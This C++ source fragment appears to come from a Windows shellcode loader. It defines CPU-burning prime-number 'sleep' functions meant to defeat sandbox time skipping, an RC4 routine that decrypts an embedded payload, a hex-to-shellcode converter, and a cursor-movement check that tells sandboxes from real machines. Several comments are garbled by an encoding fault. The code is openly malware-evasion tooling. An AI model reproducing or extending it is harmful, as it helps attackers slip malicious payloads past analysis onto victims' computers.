using namespace std;

bool isPrime(long long n) {
    if (n <= 1) return false;
    if (n <= 3) return true;
    if (n % 2 == 0 || n % 3 == 0) return false;
    for (long long i = 5; i * i <= n; i += 6) {
        if (n % i == 0 || n % (i + 2) == 0) return false;
    }
    return true;
}

// �������������
std::vector<long long> calculatePrimes(long long limit) {
    std::vector<long long> primes;
    for (long long i = 2; i <= limit; ++i) {
        if (isPrime(i)) {
            primes.push_back(i);
        }
    }
    return primes;
}

void realSleep2mins()
{
    long long limit = 278327931; // ����������
    //std::cout << "Calculating primes up to " << limit << "...\n";

    std::clock_t start = std::clock();
    std::vector<long long> primes = calculatePrimes(limit);
    std::clock_t end = std::clock();

    double elapsed_secs = double(end - start) / CLOCKS_PER_SEC;
    //std::cout << "Found " << primes.size() << " primes in " << elapsed_secs << " seconds.\n";
}

void realSleep6s()
{
    long long limit = 30832778; // 6������
    //std::cout << "Calculating primes up to " << limit << "...\n";

    std::clock_t start = std::clock();
    std::vector<long long> primes = calculatePrimes(limit);
    std::clock_t end = std::clock();

    double elapsed_secs = double(end - start) / CLOCKS_PER_SEC;
    //std::cout << "Found " << primes.size() << " primes in " << elapsed_secs << " seconds.\n";
}

void decryptRC4Xor(const char* rc4key, unsigned char* content, SIZE_T size)
{
    Rc4Context      rc4 = { 0 };
    uint32_t        dropN = 0;

    Rc4Initialise(&rc4, rc4key, (uint32_t)strlen(rc4key), dropN);
    Rc4Xor(&rc4, content, content, size);
}

unsigned char* byteToHex(char* buf)
{
    unsigned char* shellcode = (unsigned char*)calloc(strlen(buf) / 2, sizeof(unsigned char));
    for (size_t i = 0; i < strlen(buf) / 2; i++) {
        sscanf(buf, "%2hhx", &shellcode[i]);
        buf += 2;
    }
    return shellcode;
}

int checkMouseMove() // 1: sandbox 0: real
{
    POINT pt1;
    pt1.x = 1;
    pt1.y = 1;

    POINT pt2;
    pt2.x = 1;
    pt2.y = 1;

    LPPOINT current_pos = &pt1;
    LPPOINT prev_pos = &pt2;



    GetCursorPos(prev_pos);
    // sleep 6s
    realSleep6s();

    GetCursorPos(current_pos);
    if (prev_pos != nullptr && current_pos != nullptr)
    {
        if (prev_pos->x != current_pos->x || prev_pos->y != current_pos->y)
        {
            return 0;
        }
    }
    return 1;
}

